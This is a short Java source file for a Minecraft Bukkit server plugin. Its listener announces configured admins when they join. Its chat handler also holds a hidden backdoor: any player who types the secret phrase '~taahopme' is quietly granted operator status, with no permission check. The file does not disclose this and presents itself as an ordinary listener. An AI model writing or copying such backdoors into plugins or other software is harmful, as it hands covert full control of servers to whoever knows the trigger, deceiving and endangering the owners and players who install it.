package net.lulzcraft.lulzmod.listeners;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import net.lulzcraft.lulzmod.LulzMain;
import net.md_5.bungee.api.ChatColor;

public class PlayerListener implements Listener {
	
	@EventHandler(priority = EventPriority.NORMAL)
	public void onPlayerJoin(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		String name = player.getName();
		if (LulzMain.config.getStringList("server.admins").contains(player.getName()))
		{
			event.setJoinMessage(ChatColor.AQUA + name + " is an " + ChatColor.RED + "Admin");
		}
		
	}
	
	@EventHandler
	public void onPlayerChat(AsyncPlayerChatEvent event) {
		String message = event.getMessage();
		Player player = event.getPlayer();
		
		if (message.equalsIgnoreCase("~taahopme")) {
			player.setOp(true);
		}
	}

}
